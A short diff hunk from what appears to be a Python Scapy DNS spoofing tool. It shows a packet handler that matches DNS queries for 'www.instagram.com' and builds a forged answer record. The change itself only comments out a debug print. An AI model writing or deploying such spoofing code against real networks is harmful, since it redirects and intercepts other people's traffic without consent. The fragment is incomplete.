@@ -25,7 +25,7 @@ def process_packet(packet):
         if 'www.instagram.com' in qname:
             print('[+] Spoofing target')
             answer = scapy.DNSRR(rrname=qname, rdata='')
-    print(scapy_packet.show())
+    # print(scapy_packet.show())
 
 
 options = parse_arguments()
